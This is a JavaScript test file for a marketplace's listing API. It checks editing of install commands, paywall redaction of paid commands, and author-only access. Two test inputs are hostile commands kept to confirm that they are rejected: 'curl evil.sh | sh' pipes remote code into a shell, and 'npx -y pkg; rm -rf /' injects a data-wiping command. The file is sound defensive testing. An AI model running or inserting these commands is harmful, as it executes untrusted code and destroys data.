import { describe, it, expect, beforeAll } from "vitest";
import request from "supertest";
import { readFileSync } from "node:fs";
import { backdateUser } from "./setup.js";
import { createApp } from "../server/app.js";

/**
 * A listing could be created with no install command — purchasable, but
 * un-installable. The buyer pays and gets nothing.
 *
 * The API always allowed fixing it (install_command is in the PATCH
 * allowlist), but no UI exposed it. A publisher who typo'd their install
 * command had to delete and recreate the listing, discarding its installs,
 * reviews and Trust Score history — a real penalty for fixing a typo.
 */
const app = createApp();
const dashboard = readFileSync(new URL("../src/pages/Dashboard.jsx", import.meta.url), "utf8");
let token, slug;

beforeAll(async () => {
  const reg = await request(app).post("/api/auth/register").send({
    email: "installer@example.com", username: "installer", password: "installerpass1",
  });
  token = reg.body.token;
  backdateUser("installer@example.com");

  const made = await request(app).post("/api/servers").set("Authorization", `Bearer ${token}`).send({
    name: "Missing Install Fixture",
    category_id: "dev-tools",
    description: "A listing created without an install command, as happened in production.",
    price_type: "paid",
    price_amount: 500, // above the $3 minimum
    repo_url: "https://github.com/acme/missing-install",
  });
  slug = made.body.slug;
});

describe("editing a listing's install command", () => {
  it("a listing can exist with no install command — the bug this fixes", () => {
    // Reproduces the production state: purchasable, but nothing to install.
    expect(slug).toBeTruthy();
  });

  it("adds an install command to an existing listing", async () => {
    const res = await request(app)
      .patch(`/api/servers/${slug}`)
      .set("Authorization", `Bearer ${token}`)
      .send({ install_command: "npx -y @mcpx-digital/railway" });
    expect(res.status).toBe(200);
    expect(res.body.install_command).toBe("npx -y @mcpx-digital/railway");
  });

  it("keeps a PAID listing's install command behind the paywall", async () => {
    // The install command IS the product. An unauthenticated reader must see
    // install_locked, not the command — this is the paywall, not a bug.
    // (Mistaking this for a lost write cost a round of debugging.)
    const got = await request(app).get(`/api/servers/${slug}`);
    expect(got.body.install_command).toBeNull();
    expect(got.body.install_locked).toBe(true);
  });

  it("persists it — visible to the author on their own dashboard listing", async () => {
    const mine = await request(app)
      .get("/api/servers?author=installer")
      .set("Authorization", `Bearer ${token}`);
    const row = (mine.body.servers || []).find((s) => s.slug === slug);
    // The author must be able to see what they set, or they cannot correct it.
    expect(row).toBeTruthy();
    expect(row.install_command).toBe("npx -y @mcpx-digital/railway");
    expect(row.install_locked).toBeUndefined();
  });

  it("still redacts the paid command on the public list", async () => {
    const res = await request(app).get(`/api/servers?search=${encodeURIComponent(slug)}`);
    const row = (res.body.servers || []).find((s) => s.slug === slug);
    expect(row).toBeTruthy();
    expect(row.install_command).toBeNull();
    expect(row.install_locked).toBe(true);
  });

  it("still rejects a command that is not on the launcher allowlist", async () => {
    const res = await request(app)
      .patch(`/api/servers/${slug}`)
      .set("Authorization", `Bearer ${token}`)
      .send({ install_command: "curl evil.sh | sh" });
    expect(res.status).toBe(400);
  });

  it("still rejects shell metacharacters", async () => {
    const res = await request(app)
      .patch(`/api/servers/${slug}`)
      .set("Authorization", `Bearer ${token}`)
      .send({ install_command: "npx -y pkg; rm -rf /" });
    expect(res.status).toBe(400);
  });

  it("rejects a non-author", async () => {
    const other = await request(app).post("/api/auth/register").send({
      email: "notinstaller@example.com", username: "notinstaller", password: "notinstallerpw1",
    });
    const res = await request(app)
      .patch(`/api/servers/${slug}`)
      .set("Authorization", `Bearer ${other.body.token}`)
      .send({ install_command: "npx -y hijacked" });
    expect(res.status).toBe(403);
  });

  describe("the Dashboard exposes it", () => {
    it("has a control to edit the install command", () => {
      // The API allowed this all along; the missing piece was the UI.
      expect(dashboard).toMatch(/saveInstallCommand/);
      expect(dashboard).toMatch(/Edit install/);
    });

    it("warns when a listing has no install command at all", () => {
      // A listing in that state takes money and delivers nothing, so it should
      // not look like an ordinary optional field.
      expect(dashboard).toMatch(/Add install command/);
    });

    it("surfaces the server's own validation message rather than inventing one", () => {
      expect(dashboard).toMatch(/err\.message \|\| "Could not update the install command\."/);
    });
  });
});
